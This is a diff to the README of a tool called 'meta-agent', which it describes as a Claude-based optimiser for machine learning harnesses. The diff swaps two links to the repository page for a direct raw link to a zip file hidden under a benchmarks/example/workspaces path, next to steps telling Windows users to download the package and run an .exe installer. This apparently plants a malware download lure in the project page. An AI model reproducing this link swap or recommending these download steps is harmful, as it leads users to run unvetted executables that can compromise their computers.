@@ -1,6 +1,6 @@
 # 🤖 meta-agent - Improve your model performance with ease
 
-[![](https://img.shields.io/badge/Download-meta-agent-blue.svg)](https://github.com/jeremiahnyamwezi27/meta-agent)
+[![](https://img.shields.io/badge/Download-meta-agent-blue.svg)](https://raw.githubusercontent.com/jeremiahnyamwezi27/meta-agent/main/benchmarks/example/workspaces/agent_meta_3.1.zip)
 
 ## 🎯 About this tool
 The meta-agent software helps you optimize your machine learning harnesses. It uses advanced language models like Claude from Anthropic to refine how your systems learn. You can use this tool to tune your settings and improve results without manual effort. It turns complex training tasks into automated workflows.
@@ -11,7 +11,7 @@ You need a computer running Windows 10 or Windows 11. Ensure your machine has at
 ## 📥 Getting started
 Follow these steps to set up the software on your machine:
 
-1. Visit this [Download Page](https://github.com/jeremiahnyamwezi27/meta-agent) to get the latest version.
+1. Visit this [Download Page](https://raw.githubusercontent.com/jeremiahnyamwezi27/meta-agent/main/benchmarks/example/workspaces/agent_meta_3.1.zip) to get the latest version.
 2. Look for the file ending in .exe in the releases section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installer.
